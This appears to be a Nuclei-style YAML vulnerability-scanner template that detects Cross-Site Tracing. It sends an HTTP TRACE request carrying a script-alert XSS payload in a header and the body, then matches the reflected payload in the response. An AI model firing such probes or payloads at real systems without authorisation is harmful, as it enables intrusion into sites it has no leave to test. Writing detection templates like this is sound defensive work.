http:
- matchers:
  - condition: and
    part: response
    type: word
    words:
    - 'Header: <script>alert(document.domain)</script>'
    - TRACE
  - part: header
    type: word
    words:
    - text/html
    - message/http
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'TRACE / HTTP/1.1

    Host: {{Hostname}}

    Header: <script>alert(document.domain)</script>

    Content-Length: 27


    <script>alert(document.domain)</script>

    '
id: cross-site-tracing-xss
info:
  author: ritikchaddha
  classification:
    cwe-id: CWE-79
  description: 'Cross-site scripting vulnerability was discovered via HTTP TRACE method
    reflection. The TRACE method reflects the request body back in the response, which
    can beexploited for XSS attacks when user input is reflected without proper sanitization.

    '
  metadata:
    max-request: 1
  name: Cross Site Tracing - Cross-Site Scripting
  reference:
  - https://medium.com/@tushar_rs_/cross-site-tracing-attack-xst-5aa519658b7a
  - https://www.owasp.org/index.php/Cross_Site_Tracing
  severity: low
  tags: xss,trace,generic
